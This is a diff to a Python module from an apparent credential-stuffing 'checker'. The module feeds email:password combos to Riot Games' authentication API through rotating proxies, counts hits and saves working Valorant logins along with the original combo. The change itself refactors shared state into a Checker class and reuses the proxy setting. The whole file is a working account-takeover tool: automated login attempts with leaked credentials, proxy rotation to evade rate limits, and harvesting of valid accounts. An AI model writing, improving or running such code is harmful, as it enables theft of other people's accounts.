@@ -1,12 +1,14 @@
-from __main__ import checker
+from modules.variables import Checker
 from requests import Session
 from modules.functions import bad_proxy, log,save,set_proxy
 
 def check(email:str,password:str):
     username = email.split("@")[0] if "@" in email else email
     retries = 0
-    while retries != checker.retries:
+    while retries != Checker.retries:
         proxy = set_proxy()
+        proxy_set = set_proxy(proxy)
+
         headers = {
             "Host": "auth.riotgames.com" ,
             "user-agent": "RiotClient/30.0.1.3715678.3712489 rso-auth (Windows;10;;Professional, x64)" ,
@@ -18,24 +20,24 @@ def check(email:str,password:str):
         data_2 = {"language":"en_US","password":password,"region":None,"remember":False,"type":"auth","username":username}
         try:
             with Session() as s:
-                s.post("https://auth.riotgames.com/api/v1/authorization",headers=headers,json=data_1,proxies=set_proxy(proxy),timeout=checker.timeout)
-                response = s.put("https://auth.riotgames.com/api/v1/authorization",headers=headers,json=data_2,proxies=set_proxy(proxy),timeout=checker.timeout).text
+                s.post("https://auth.riotgames.com/api/v1/authorization",headers=headers,json=data_1,proxies=proxy_set,timeout=Checker.timeout)
+                response = s.put("https://auth.riotgames.com/api/v1/authorization",headers=headers,json=data_2,proxies=proxy_set,timeout=Checker.timeout).text
                 if "auth_failure" in response:
                     retries += 1
                 elif "access_token" in response:
-                    if not checker.cui:
+                    if not Checker.cui:
                         log("good",username+":"+password,"Valorant")
-                    save("Valorant","good",checker.time,username+":"+password+f" | Original Combo: {email}:{password}")
-                    checker.good += 1
-                    checker.cpm += 1
+                    save("Valorant","good",Checker.time,username+":"+password+f" | Original Combo: {email}:{password}")
+                    Checker.good += 1
+                    Checker.cpm += 1
                     return
                 else:
                     raise
         except:
             bad_proxy(proxy)
-            checker.errors += 1
-    if not checker.cui:
+            Checker.errors += 1
+    if not Checker.cui:
         log("bad",username+":"+password,"Valorant")
-    checker.bad += 1
-    checker.cpm += 1
+    Checker.bad += 1
+    Checker.cpm += 1
     return
